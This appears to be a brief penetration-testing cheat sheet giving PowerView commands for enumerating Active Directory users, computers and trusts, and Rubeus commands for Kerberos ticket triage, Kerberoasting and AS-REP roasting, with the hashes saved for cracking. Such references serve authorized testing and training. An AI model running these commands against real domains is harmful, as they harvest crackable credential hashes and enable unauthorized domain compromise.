# PowerView & Rubeus

Compact reference for common PowerView and Rubeus tasks.

### PowerView users

```powershell
Get-DomainUser | Select-Object samaccountname
```

**Tool:** PowerView · **Platform:** Windows · **Tags:** AD, Users · **Context:** Domain user

### PowerView computers

```powershell
Get-DomainComputer | Select-Object dnshostname,operatingsystem
```

**Tool:** PowerView · **Platform:** Windows · **Tags:** AD, Computers · **Context:** Domain user

### PowerView trusts

```powershell
Get-DomainTrust
```

**Tool:** PowerView · **Platform:** Windows · **Tags:** AD, Trusts · **Context:** Domain user

### Rubeus tickets

```powershell
Rubeus.exe triage
```

**Tool:** Rubeus · **Platform:** Windows · **Tags:** Kerberos, Tickets · **Context:** Domain user

### Rubeus Kerberoast

```powershell
Rubeus.exe kerberoast /outfile:kerberoast.txt
```

**Tool:** Rubeus · **Platform:** Windows · **Tags:** Kerberos, Kerberoast · **Context:** Domain user

### Rubeus AS-REP roast

```powershell
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

**Tool:** Rubeus · **Platform:** Windows · **Tags:** Kerberos, AS-REP · **Context:** Domain user

---

**Related:** [Overview](./) · [Nuclei](nuclei.md) · [Powerview](powerview.md)
